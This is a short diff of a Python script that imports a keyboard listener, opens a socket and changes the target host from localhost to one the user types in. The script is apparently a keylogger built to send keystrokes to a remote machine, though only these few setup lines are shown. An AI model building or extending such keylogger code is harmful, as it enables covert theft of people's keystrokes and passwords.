@@ -3,7 +3,7 @@ import os
 import threading
 from pynput.keyboard import Listener
 socket = s.socket()
-HOST = "127.0.0.1"
+HOST = input("type your host: ")
 PORT = 1234
 flag_key_loggger_break = False
 
